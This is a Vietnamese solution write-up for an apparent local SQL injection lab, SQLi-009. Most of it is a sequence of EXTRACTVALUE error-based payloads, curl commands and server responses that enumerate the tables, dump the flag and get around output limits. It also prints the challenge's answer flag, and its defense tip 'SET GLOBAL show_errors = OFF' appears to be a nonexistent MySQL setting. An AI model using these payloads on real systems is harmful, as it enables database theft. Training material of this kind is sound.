# SQLi-009 Solution

## ⚠️ **BROWSER CACHE PROBLEM - ĐỌC ĐẦU TIÊN!**

### 🚨 Vấn đề: Cả `version()` và `database()` đều trả về `~8.0.44~`

**➡️ NGUYÊN NHÂN: Browser đang cache HTTP response!**

### ✅ **GIẢI PHÁP (Chọn 1 trong 4):**

#### **1. Python Script (KHUYẾN NGHỊ):**

```bash
python solution/exploit.py
```

#### **2. curl (NO CACHE):**

```bash
curl "http://localhost:5009/?id=1'%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,(SELECT%20version()),0x7e))--%20-"
curl "http://localhost:5009/?id=1'%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,(SELECT%20database()),0x7e))--%20-"
```

#### **3. Burp Suite:** Send to Repeater → Modify → Send

#### **4. Browser:**

- Incognito mode (`Ctrl+Shift+N`)
- MỞ TAB MỚI cho mỗi test
- F12 → Network → ✅ Disable cache
- Thêm `&_=random_number`

---

## EXTRACTVALUE Error-based Extraction

### Step 1: Extract MySQL version

**Payload:**

```
/?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))-- -
```

**Query thực thi:**

```sql
SELECT * FROM products WHERE id = '1' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))-- -'
```

**Response:**

```
⚠️ Database Error:
XPATH syntax error: '~8.0.44~'
```

**Kết quả:** MySQL version = `8.0.44`

---

### Step 2: Extract database name

**Payload:**

```
/?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,database(),0x7e))-- -
```

**Query thực thi:**

```sql
SELECT * FROM products WHERE id = '1' AND EXTRACTVALUE(1,CONCAT(0x7e,database(),0x7e))-- -'
```

**Response:**

```
⚠️ Database Error:
XPATH syntax error: '~shopdb~'
```

**Kết quả:** Database name = `shopdb`

**💡 Nếu vẫn thấy `~8.0.44~` thay vì `~shopdb~`, hãy clear cache browser!**

---

### Step 3: Enumerate tables

#### **Cách 1: Extract từng table một (LIMIT)**

**Payload (table đầu tiên):**

```
/?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e))-- -
```

**Response:**

```
XPATH syntax error: '~flags~'
```

**Payload (table thứ 2):**

```
/?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1),0x7e))-- -
```

**Response:**

```
XPATH syntax error: '~products~'
```

#### **Cách 2: Extract tất cả tables cùng lúc (GROUP_CONCAT)**

**Payload:**

```
/?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))-- -
```

**Response:**

```
XPATH syntax error: '~flags,products~'
```

**Kết quả:** Tables = `flags`, `products`

---

#### ⚠️ **LỖI THƯỜNG GẶP - NHẦM LẪN SQL SYNTAX**

**❌ SAI - Dùng SQL Server syntax trong MySQL:**

```sql
-- STRING_AGG() là của SQL Server/PostgreSQL, KHÔNG phải MySQL
SELECT STRING_AGG(table_name, ',') FROM information_schema.tables

-- FOR XML PATH('') là của SQL Server, KHÔNG phải MySQL
SELECT table_name + ',' FROM information_schema.tables FOR XML PATH('')
```

**✅ ĐÚNG - MySQL syntax:**

```sql
-- MySQL dùng GROUP_CONCAT()
SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()

-- Có thể custom separator
SELECT GROUP_CONCAT(table_name SEPARATOR '|') FROM information_schema.tables
```

---

### Step 4: Extract columns từ bảng flags

#### **Cách 1: Extract từng column (LIMIT)**

**Payload:**

```
/?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='flags' LIMIT 0,1),0x7e))-- -
```

**Response:**

```
XPATH syntax error: '~flag_value~'
```

#### **Cách 2: Extract tất cả columns (GROUP_CONCAT) - KHUYẾN NGHỊ**

**Payload:**

```
/?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='flags'),0x7e))-- -
```

**URL Encoded:**

```
GET /?id=1'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+GROUP_CONCAT(column_name)+FROM+information_schema.columns+WHERE+table_name%3d'flags'),0x7e))--+- HTTP/1.1
```

**Response:**

```
XPATH syntax error: '~id,flag_value~'
```

**Kết quả:** Columns = `id`, `flag_value`

---

### Step 5: Extract flag

#### **Cách 1: Extract từng record (LIMIT)**

**Payload:**

```
/?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT flag_value FROM flags LIMIT 0,1),0x7e))-- -
```

**Response:**

```
XPATH syntax error: '~FLAG{3xtr4ctv4lu3_mysql_3rr0r_b4s3d}~'
```

#### **Cách 2: Extract tất cả records (GROUP_CONCAT) - NHANH HƠN**

**Payload:**

```
/?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(flag_value) FROM flags),0x7e))-- -
```

**URL Encoded:**

```
GET /?id=1'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+GROUP_CONCAT(flag_value)+FROM+flags),0x7e))--+- HTTP/1.1
```

**Response:**

```
XPATH syntax error: '~FLAG{3xtr4ctv4lu3_mysql_3rr0r_b4s3d}~'
```

**💡 Ưu điểm GROUP_CONCAT():**

- ✅ Extract nhiều rows cùng lúc (nếu có nhiều flags)
- ✅ Tiết kiệm thời gian (không cần LIMIT loop)
- ✅ Thấy được tất cả data trong 1 request

---

## 🏁 Flag

```
FLAG{3xtr4ctv4lu3_mysql_3rr0r_b4s3d}
```

---

## 🔍 Tổng Kết

### Kỹ thuật EXTRACTVALUE() Error-based SQLi

**Cách hoạt động:**

1. `EXTRACTVALUE(xml_doc, xpath_expr)` extract data từ XML
2. Khi `xpath_expr` bắt đầu bằng `~` (0x7e), MySQL báo lỗi
3. Error message chứa giá trị của xpath → leak data

**Syntax:**

```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT data), 0x7e))-- -
```

**Ưu điểm:**

- ✅ Không cần UNION (không cần biết số cột)
- ✅ Works với WHERE, INSERT, UPDATE
- ✅ Bypass WAF dễ hơn boolean-blind

**Nhược điểm:**

- ❌ Giới hạn 32 ký tự per query
- ❌ Cần error messages visible
- ❌ Chỉ hoạt động trên MySQL

**Giải pháp cho giới hạn 32 ký tự:**

```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT data),1,31),0x7e))-- -
' AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT data),32,31),0x7e))-- -
```

---

### 📊 So Sánh Concatenation Functions Giữa Các DBMS

| DBMS           | Function                   | Example                                   |
| -------------- | -------------------------- | ----------------------------------------- |
| **MySQL**      | `GROUP_CONCAT()`           | `SELECT GROUP_CONCAT(name) FROM users`    |
| **PostgreSQL** | `STRING_AGG()`             | `SELECT STRING_AGG(name, ',') FROM users` |
| **SQL Server** | `STRING_AGG()` + `FOR XML` | `SELECT STRING_AGG(name, ',') FROM users` |
| **Oracle**     | `LISTAGG()`                | `SELECT LISTAGG(name, ',') FROM users`    |
| **SQLite**     | `GROUP_CONCAT()`           | `SELECT GROUP_CONCAT(name) FROM users`    |

**⚠️ LƯU Ý:** Mỗi DBMS có syntax riêng! Không thể dùng `STRING_AGG()` trong MySQL hay `FOR XML PATH('')` trong PostgreSQL.

---

### 🎯 MySQL-Specific Functions Cần Nhớ

```sql
-- Concatenate multiple rows
GROUP_CONCAT(column_name)
GROUP_CONCAT(column_name SEPARATOR '|')
GROUP_CONCAT(DISTINCT column_name ORDER BY column_name)

-- Substring (có nhiều cách)
SUBSTRING(str, pos, len)
SUBSTR(str, pos, len)
MID(str, pos, len)

-- String concat
CONCAT(str1, str2, ...)
CONCAT_WS(separator, str1, str2, ...)

-- Hex encoding
HEX(str)
UNHEX(hex_str)
```

---

## 🛡️ Defense

**Secure coding:**

```python
# ❌ Vulnerable
sql = f"SELECT * FROM products WHERE id = '{product_id}'"

# ✅ Secure - Prepared statements
cursor.execute("SELECT * FROM products WHERE id = %s", (product_id,))
```

**MySQL settings:**

```sql
-- Disable error details in production
SET GLOBAL show_errors = OFF;
```
